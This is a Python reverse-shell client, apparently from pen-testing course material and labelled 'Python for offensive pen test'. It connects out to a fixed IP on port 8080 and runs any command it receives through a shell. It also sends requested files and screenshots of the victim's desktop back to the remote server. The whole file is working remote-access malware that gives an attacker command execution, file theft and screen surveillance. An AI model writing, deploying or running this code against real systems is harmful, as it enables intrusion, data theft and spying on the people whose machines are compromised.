# Python for offensive pen test
# Screen Capture
# Client.py

import socket
import subprocess
import os
import shutil
from PIL import ImageGrab
import tempfile

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        f.close()
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def connecting():
    s = socket.socket()
    s.connect(("192.168.229.131", 8080))

    while True:
        command = s.recv(5000)
        if 'terminate' in command.decode():
            s.close()
            break

        # Remember the Formula is grab*<File Path>
        # Example: grab*C:\Users\Levi\Desktop\photo.jpeg

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass

        elif 'screencap' in command.decode():
            # Create a temp dir to store our screenshot file
            # Sample dirpath: C:\Users\Levi\AppData\Local\Temp\<Goop>
            dirpath = tempfile.mkdtemp()

            # grab() method takes a snapshot of the screen
            # save() method saves the snapshot in the temp dir
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
            transfer(s, dirpath + "\img.jpg") # Transfer to the server using our transfer funtion
            shutil.rmtree(dirpath) # Delete the temp direcotry using shutil remove tree

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    connecting()
main()
